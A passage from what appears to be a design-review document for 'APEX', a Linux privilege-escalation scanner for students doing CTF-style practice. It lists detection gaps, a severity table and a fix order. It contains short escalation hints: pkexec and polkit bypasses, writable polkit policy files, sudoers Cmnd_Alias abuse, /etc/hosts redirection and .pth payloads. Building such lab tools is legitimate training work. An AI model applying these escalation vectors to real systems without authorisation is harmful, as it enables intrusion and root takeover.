        register_finding "LATERAL_SUID" "$f" \
            "SUID binary owned by $target_user" 65 "lateral_suid"
    done
}
```

---

### MEDIUM-7: No D-Bus Privilege Escalation Detection

**Problem:**
```
D-Bus is a common attack vector (polkit/pkexec, CVE-2021-4034 predecessor attacks,
GNOME/KDE service exploits) but APEX design has:
- "busctl list" in Engine 1 mapper
- No analysis of what those services do
- No check for exploitable polkit rules
- No check for pkexec vulnerability specifically

Polkit (pkexec) rules define who can do what via D-Bus.
If a policy allows our user to run actions as root:
  pkexec /usr/bin/env                    ← classic polkit bypass
  dbus-send --system --print-reply ...   ← direct D-Bus action

/etc/polkit-1/localauthority/50-local.d/*.pkla: local policy overrides
If writable → can grant ourselves root via polkit action
```

---

### MEDIUM-8: No Check for Readable /etc/sudoers vs sudo -n -l

**Problem:**
```
sudo -n -l shows only OUR rules.
/etc/sudoers (if readable) shows ALL users' rules.

Value of reading /etc/sudoers directly:
  1. See other users' sudo rules → predict lateral movement paths
  2. See group-based sudo rules we might qualify for via newgrp
  3. See !exception patterns more clearly (full rule context)
  4. Works even if sudo binary is weird/patched

Design says "Check /etc/sudoers if readable" but doesn't specify:
  - Parse ALL users' rules for lateral movement prediction
  - Parse group rules and cross-reference with ALL our groups
  - Parse Cmnd_Alias definitions (students often miss these)
    Alias: SHUTDOWN = /sbin/reboot, /sbin/shutdown
    Rule: user ALL = SHUTDOWN  ← means /sbin/reboot available!
```

---

## LOW SEVERITY GAPS

---

### LOW-1: No Size Anomaly Database Is Maintained

**Where:** 04_ADVERSARIAL_ANALYSIS.md check_size_anomaly()
**Problem:** The `expected_min_sizes` hash is hardcoded with a few values.
Actual system binary sizes vary by distro, version, and architecture.
A size that's "normal" on 64-bit Ubuntu is wrong for 32-bit Alpine.
The approach is right but the database needs to be dynamic:
gather actual sizes from known-good binaries at runtime.

---

### LOW-2: pspy Output Correlation Is Underspecified

**Where:** 01_PHILOSOPHY_AND_CORE_LOGIC.md section 3.3, not fully designed anywhere
**Problem:** Design says "if root runs our binary and then runs something else,
correlate the chain." But the actual correlation logic (timing window, parent-child
relationship via /proc/$pid/status PPid field) is never implemented in the design.

---

### LOW-3: No Check for Writable /etc/hosts

**Problem:** Writable /etc/hosts allows DNS poisoning.
If root uses `curl https://internal-service/config` and we redirect that hostname,
we control what root fetches. Very specific but real vector (seen in HTB machines).

---

### LOW-4: No Verification That Cron Is Actually Running

**Problem:** APEX finds cron jobs and assumes they run.
But crond may be stopped/disabled. A cron job that never runs = useless path.
Should check: `systemctl is-active cron crond cronie` or `/proc/*/comm` for cron process.

---

### LOW-5: Confidence Score Has No Decay for "Already Tried" Paths

**Problem:** After initial scan, if student tries Path 1 and it fails,
APEX re-runs and shows the same paths at the same confidence.
Need a "mark as tried" mechanism: tried + failed = confidence capped at 30%.
Prevents student from re-trying same failed path on second APEX run.

---

## SUMMARY TABLE

| ID | Severity | Problem | Impact |
|----|----------|---------|--------|
| C-1 | CRITICAL | safe_run() double-shell-interpretation | Silent failures on complex commands |
| C-2 | CRITICAL | Parallel findings race condition | Lost findings, corrupted output |
| C-3 | CRITICAL | Alpine /etc/periodic not scanned | Blind on 40% of Docker containers |
| C-4 | CRITICAL | /etc/passwd writable not checked | Misses 99% confidence root vector |
| C-5 | CRITICAL | sudo multi-line parse fails | Misses commands on continuation lines |
| C-6 | CRITICAL | Immutable files not checked | High false-positive on maker traps |
| H-1 | HIGH | .pth execution model wrong | Wrong payload, exploit fails silently |
| H-2 | HIGH | SUID RPATH/ld.conf dir not checked | Misses reliable root vector |
| H-3 | HIGH | `su` not in credential testing | Credential found but can't use it |
| H-4 | HIGH | Inline pspy has high miss rate | Fast processes completely missed |
| H-5 | HIGH | Per-job PATH override not checked | Cron PATH hijack false positive |
| H-6 | HIGH | Only tar wildcard injection | Misses rsync/chown/chmod wildcards |
| H-7 | HIGH | Unsanitized output terminal injection | Maker can corrupt APEX output |
| M-1 | MEDIUM | Predictable temp files | Symlink attack on own temp files |
| M-2 | MEDIUM | Capability hex decode wrong | Wrong cap detection → missed vectors |
| M-3 | MEDIUM | Groups after login not detected | Misses newly added group memberships |
| M-4 | MEDIUM | Heredoc content not analyzed | Injection points inside heredocs missed |
| M-5 | MEDIUM | /etc/profile.d not checked | Writable login script vector missed |
| M-6 | MEDIUM | No lateral movement prediction | Credential found but path unclear |
| M-7 | MEDIUM | D-Bus/polkit not analyzed | polkit escalation paths missed |
| M-8 | MEDIUM | sudoers Cmnd_Alias not parsed | Aliased commands look blocked, aren't |
| L-1 | LOW | Static size database | Size anomaly check unreliable across distros |
| L-2 | LOW | pspy correlation unimplemented | Root-calls-our-binary chain not followed |
| L-3 | LOW | /etc/hosts not checked | Writable hosts DNS redirect missed |
| L-4 | LOW | Cron running status not verified | Dead cron paths shown as valid |
| L-5 | LOW | No tried-and-failed memory | Student re-tries same dead paths |

---

## BEFORE WRITING LINE 1: Fix These In Order

```
1. Redesign safe_run() to use array args, not string (C-1)
2. Design atomic finding storage (temp file per finding + mv rename) (C-2)
3. Add /etc/periodic to all cron scan locations (C-3)
4. Add /etc/passwd writable check to credential section (C-4)
5. Fix sudo parser for multi-line + continuation rules (C-5)
6. Add verify_actually_writable() with lsattr check before every write (C-6)
7. Fix .pth payload generation to use 'import ' prefix (H-1)
8. Add RPATH + ld.conf directory check to SUID analysis (H-2)
9. Add su credential testing via expect/python pty (H-3)
10. Fix pspy: inotifywait first, polling last, honest warning about miss rate (H-4)
11. Fix all output to use safe_output() stripping control chars (H-7)
```
